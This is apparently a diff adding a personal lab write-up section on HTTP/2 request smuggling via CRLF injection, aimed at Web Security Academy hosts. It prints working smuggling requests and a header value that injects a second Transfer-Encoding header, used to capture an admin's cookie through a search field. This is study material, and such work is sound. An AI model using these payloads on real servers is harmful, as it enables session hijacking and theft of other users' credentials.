@@ -626,3 +626,42 @@ Then, we modify both the paths in the request, and we make the second smuggled r
     Host: 0a6300e5031f645f808858e9009a0029.web-security-academy.net
     \r\n // don't forget it.
  We ca automate the process with burp, and DON'T FORGET TO DEACTIVATE UPDATE CONTENT-LENGTH !! OTHERWISE IT WILL NOT WORK
+
+ ## Request smuggling via CRLF injection (Carriage Return Line Feed) 
+ This lab is very tricky,
+ we first need to confirm the vulnerability with this payload : 
+We try this normal payload, but it's not working, since we assume that the front end changes the request and removes the TE
+    POST / HTTP/2
+    Host: 0aa4008403b6223b808fa3f6006400f5.web-security-academy.net
+    Cookie: session=zddT9jkVATHFQ8bDQVmg9rRI17DxjGCW
+    Content-Type: application/x-www-form-urlencoded
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /bahhjk HTTP/1.1
+    X-Ignore: x
+
+The first payload it's not working, so what we have to do is add for example
+
+`foo: bar\r\nTransfer-Encoding: chunked` in burp binary (request headers), and remove it from the head, and it should work 
+
+and to get the payload, we have a search bar, that we can add, and smuggle this request, so that if an admin get poisoned we can get his creds.
+So we smuggle this payload 
+
+    POST / HTTP/2
+    Host: 0aa4008403b6223b808fa3f6006400f5.web-security-academy.net
+    Cookie: session=zddT9jkVATHFQ8bDQVmg9rRI17DxjGCW
+    Content-Type: application/x-www-form-urlencoded
+
+    0
+
+    POST / HTTP/1.1
+    Host: 0aa4008403b6223b808fa3f6006400f5.web-security-academy.net
+    Cookie: session=zddT9jkVATHFQ8bDQVmg9rRI17DxjGCW
+    Content-Length: 900
+    Content-Type: application/x-www-form-urlencoded
+
+    search=toto
+
+We sent the content-length to a 1000 to try to get the admin cookie, and don't forget to set out session cookie finally add  `foo: bar\r\nTransfer-Encoding: chunked` and we have just to wait if the admin get poisoned we get his cookie in the search bar.
